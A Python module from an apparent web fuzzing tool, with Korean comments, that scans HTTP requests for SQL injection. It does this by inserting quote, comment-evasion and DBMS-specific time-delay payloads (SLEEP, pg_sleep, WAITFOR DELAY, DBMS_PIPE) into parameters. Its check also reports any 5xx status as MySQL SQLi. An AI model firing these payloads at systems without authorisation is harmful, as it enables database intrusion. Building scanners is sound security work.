# pylint: disable=too-many-arguments,too-many-locals,duplicate-code,too-many-statements,too-many-branches
"""
Error-based + Time-based SQL Injection 취약점 스캐너 모듈입니다.

- BaseScanner를 사용해 Smart Web Fuzzer의 스캐너 역할 수행
- Error-based: 단순 쿼터 삽입 및 페이로드로 SQL 오류 유발
- Time-based: DBMS별 sleep/delay 코드로 응답 지연 유발
- Celery 없이도 동작 가능한 동기 방식으로 구성
"""

import traceback
from datetime import datetime
from typing import Any, Dict, List, Set, Iterable, cast
from requests.exceptions import RequestException

from db_writer import (
    insert_fuzzed_request,
    insert_fuzzed_response,
    insert_vulnerability_scan_result,
)
from scanners.base import BaseScanner
from fuzzing_scheduler.fuzzing_scheduler import send_fuzz_request
from typedefs import RequestData, Body

DB_ERRORS: Dict[str, List[str]] = {
    "MySQL": [
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "ExtractValue",
        "UpdateXML",
    ],
    "PostgreSQL": ["pg_query():", "supplied argument is not a valid PostgreSQL result"],
    "MSSQL": ["Unclosed quotation mark", "Microsoft OLE DB Provider"],
    "Oracle": ["ORA-01756", "ORA-00933"],
}


def analyze_response(response: Dict[str, Any]) -> Dict[str, Any]:
    """HTTP 응답을 분석하여 Error-based 또는 Time-based SQLi 여부를 판단"""
    text = (response.get("text") or "").replace("\x00", "")
    status = response.get("status_code", 200)
    extra = response.get("extra") or {}
    payload = extra.get("payload")
    payload_type = extra.get("payload_type", "error")
    elapsed = response.get("elapsed_time", 0)

    if payload_type == "time":
        dbms = extra.get("dbms", "Unknown")
        if elapsed >= 4.5:
            return {
                "type": "Time-based SQLi",
                "scan_url": response.get("url"),
                "dbms": dbms,
                "payload": payload,
                "evidence": f"Delayed response ({elapsed:.2f}s)",
            }
    else:
        for dbms, errors in DB_ERRORS.items():
            for err in errors:
                if err in text or status >= 500:
                    return {
                        "type": "Error-based SQLi",
                        "scan_url": response.get("url"),
                        "dbms": dbms,
                        "payload": payload,
                        "evidence": err,
                    }
    return {}


class SqliScanner(BaseScanner):
    """SQL Injection 취약점 스캐너 (Error-based + Time-based 탐지)"""

    @property
    def vulnerability_name(self) -> str:
        """탐지할 취약점 이름 (고정 문자열 반환)"""
        return "sql_injection"

    @property
    def description(self) -> str:
        """SQL Injection 취약점에 대한 간략한 설명"""
        return "쿼터, 숫자형/문자형 페이로드로 SQL 문법 오류 또는 응답 지연 유발 → SQLi 탐지"

    @property
    def risk_level(self) -> str:
        """취약점의 위험도 수준을 반환 (예: high)"""
        return "high"

    def __init__(self):
        """SQLiScanner 초기화 (페이로드 및 타임 딜레이 설정)"""
        self.payloads = [
            "'",
            '"',
            " \"' ",
            "abc'",
            "-1",
            "null",
            "(141)",
            "142-1",
            "14'||'1",
            "14'%2b'1",
            '14"%20"1',
            "141/**/",
            "141%20--%20",
            "'/*Afd*/oR/*ror*/'af'/*asd=*/='af'/*g-g*/ --",
        ]
        self.time_payloads = {
            "MySQL": "' OR IF(1=1, SLEEP(5), 0)-- ",
            "PostgreSQL": "'; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--",
            "MSSQL": "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "Oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        }

    def is_target(self, request_id: int, request: RequestData) -> bool:
        """SQLi 탐지 대상 요청인지 판단 (GET/POST + 적절한 Content-Type)"""
        method = request["meta"].get("method", "")
        if method == "GET":
            return True
        if method == "POST":
            content_type = "".join(
                h.get("value", "")
                for h in (request.get("headers") or [])
                if h.get("key", "").lower() == "content-type"
            )
            return (
                "application/x-www-form-urlencoded" in content_type
                or "application/json" in content_type
            )
        return False

    def generate_fuzzing_requests(self, request: RequestData) -> Iterable[RequestData]:
        """파라미터마다 다양한 SQLi 페이로드 삽입 요청 생성"""
        seen: Set[tuple] = set()
        method = request["meta"].get("method", "")
        query = request.get("query_params") or []
        body = request.get("body") or {}

        for payload in self.payloads:
            if method == "GET":
                for param in query:
                    key = param["key"]
                    if (key, payload) in seen:
                        continue
                    seen.add((key, payload))
                    mutated = request.copy()
                    new_query = [q.copy() for q in query]
                    for q in new_query:
                        if q["key"] == key:
                            q["value"] = payload
                    mutated["query_params"] = new_query
                    mutated["extra"] = {
                        "param_key": key,
                        "payload": payload,
                        "payload_type": "error",
                    }
                    yield mutated
            elif method == "POST" and isinstance(body, dict):
                for key in body:
                    if (key, payload) in seen:
                        continue
                    seen.add((key, payload))
                    mutated = request.copy()
                    new_body = dict(body)
                    new_body[key] = payload
                    mutated["body"] = cast(Body, new_body)
                    mutated["extra"] = {
                        "param_key": key,
                        "payload": payload,
                        "payload_type": "error",
                    }
                    yield mutated

        for dbms, payload in self.time_payloads.items():
            if method == "GET":
                for param in query:
                    key = param["key"]
                    if (key, payload) in seen:
                        continue
                    seen.add((key, payload))
                    mutated = request.copy()
                    new_query = [q.copy() for q in query]
                    for q in new_query:
                        if q["key"] == key:
                            q["value"] = payload
                    mutated["query_params"] = new_query
                    mutated["extra"] = {
                        "param_key": key,
                        "payload": payload,
                        "payload_type": "time",
                        "dbms": dbms,
                    }
                    yield mutated
            elif method == "POST" and isinstance(body, dict):
                for key in body:
                    if (key, payload) in seen:
                        continue
                    seen.add((key, payload))
                    mutated = request.copy()
                    new_body = dict(body)
                    new_body[key] = payload
                    mutated["body"] = cast(Body, new_body)
                    mutated["extra"] = {
                        "param_key": key,
                        "payload": payload,
                        "payload_type": "time",
                        "dbms": dbms,
                    }
                    yield mutated

    def run(self, request_id: int, request: RequestData) -> List[Dict[str, Any]]:
        """해당 요청에 대해 SQLi 페이로드 생성 → 전송 → 응답 분석 → DB 기록"""
        print(f"[{self.vulnerability_name}] 요청 ID: {request_id}")
        if not self.is_target(request_id, request):
            return []

        results = []
        seen = set()

        for fuzzing_request in self.generate_fuzzing_requests(request):
            try:
                raw = send_fuzz_request(fuzzing_request)
                output = analyze_response(raw)

                if not output:
                    continue

                frq = raw.get("request_data", {})
                extra = frq.get("extra", {}) or {}
                url = output.get("scan_url", "")
                key = extra.get("param_key", "")
                payload = extra.get("payload", "")
                if (url, key, payload) in seen:
                    continue
                seen.add((url, key, payload))

                fuzz_req_id = insert_fuzzed_request(
                    to_fuzzed_request_dict(
                        frq, request_id, self.vulnerability_name, payload
                    )
                )
                insert_fuzzed_response(to_fuzzed_response_dict(raw), fuzz_req_id)

                print("[SQL Injection 탐지됨]")
                print(f" - URL: {url}\n - 파라미터: {key}\n - 입력값: {payload}")
                print(
                    f" - DBMS: {output.get('dbms')}\n - 근거: {output.get('evidence')}"
                )

                insert_vulnerability_scan_result(
                    {
                        "vulnerability_name": self.vulnerability_name,
                        "original_request_id": request_id,
                        "fuzzed_request_id": fuzz_req_id,
                        "domain": frq.get("meta", {}).get("domain", ""),
                        "endpoint": frq.get("meta", {}).get("path", ""),
                        "method": frq.get("meta", {}).get("method", ""),
                        "payload": payload,
                        "parameter": key,
                        "extra": {
                            "confidence": 0.9,
                            "details": output.get("evidence"),
                            "timestamp": datetime.now().isoformat(),
                            "type": output.get("type", "Unknown"),
                        },
                    }
                )

                results.append(output)

            except RequestException as e:
                print(f"[!] 요청 실패: {type(e).__name__}: {e}")
            except (KeyError, ValueError, TypeError, AttributeError) as e:
                print(f"[!] 응답 처리 중 오류 발생: {type(e).__name__}: {e}")
            except Exception as e:  # pylint: disable=broad-exception-caught
                print(f"[!] 알 수 없는 예외 발생: {type(e).__name__}: {e}")
                traceback.print_exc()

        return results


def to_fuzzed_request_dict(
    fuzzing_request: RequestData, original_request_id: int, scanner: str, payload: str
) -> Dict[str, Any]:
    """퍼징 요청 데이터를 DB 저장용 딕셔너리로 변환"""
    meta = fuzzing_request.get("meta") or {}
    headers = {
        h.get("key"): h.get("value") for h in (fuzzing_request.get("headers") or [])
    }
    return {
        "original_request_id": original_request_id,
        "scanner": scanner,
        "payload": payload,
        "is_http": meta.get("is_http"),
        "http_version": meta.get("http_version"),
        "domain": meta.get("domain"),
        "path": meta.get("path"),
        "method": meta.get("method"),
        "timestamp": meta.get("timestamp"),
        "headers": headers,
        "query": fuzzing_request.get("query_params"),
        "body": fuzzing_request.get("body"),
    }


def to_fuzzed_response_dict(fuzzed_response: Dict[str, Any]) -> Dict[str, Any]:
    """퍼징 응답 데이터를 DB 저장용 딕셔너리로 변환"""
    headers = fuzzed_response.get("headers") or {}
    content_type = headers.get("Content-Type", "")
    charset = None
    if "charset=" in content_type:
        charset = content_type.split("charset=")[-1].strip()
    return {
        "http_version": fuzzed_response.get("http_version"),
        "status_code": fuzzed_response.get("status_code"),
        "timestamp": fuzzed_response.get("timestamp"),
        "headers": headers,
        "body": {
            "content_type": content_type,
            "charset": charset,
            "content_length": headers.get("Content-Length"),
            "content_encoding": headers.get("Content-Encoding"),
            "body": (fuzzed_response.get("body") or "").replace("\x00", ""),
        },
    }
